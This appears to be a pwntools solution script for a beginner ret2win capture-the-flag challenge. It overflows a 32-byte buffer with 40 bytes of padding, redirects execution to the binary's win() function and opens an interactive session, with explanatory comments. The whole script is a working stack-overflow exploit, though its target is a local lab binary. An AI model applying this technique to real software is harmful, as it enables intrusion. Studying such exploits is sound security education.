from pwn import *

binary = './ret2tutorial'

elf = context.binary = ELF(binary)

p = remote('localhost', 1337)
#p = process(binary)

p.recvuntil(b'pwn challenge? Y/N:')
p.sendline(b'N')

p.recvuntil(b'ever go wrong?')

# win address found in gdb using 'info functions'
win = 0x0000000000401227

# Use b"" here to indicate that A is a byte and not a string, p64() is used to format the win() address correctly
# 32 bytes for message[] + 8 bytes for rbp = 40 bytes before overwriting RSP
payload = b'A'*40 + p64(win)

# Sending payload
p.sendline(payload)

p.interactive()

